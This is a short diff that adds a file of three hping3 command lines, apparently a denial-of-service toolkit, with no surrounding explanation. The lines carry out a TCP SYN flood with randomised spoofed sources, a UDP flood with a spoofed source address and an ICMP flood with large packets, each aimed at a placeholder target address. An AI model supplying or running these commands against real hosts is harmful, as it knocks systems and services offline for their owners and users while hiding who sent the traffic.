@@ -1,0 +1,3 @@
+hping3 -S --flood --rand-source -c 10000 (IP)
+hping3 --udp -c 9000 -i u10000 -a (SPOOF IP) (IP)
+hping3 --icmp -d 1000 -c 11000 -i u13333 (IP)
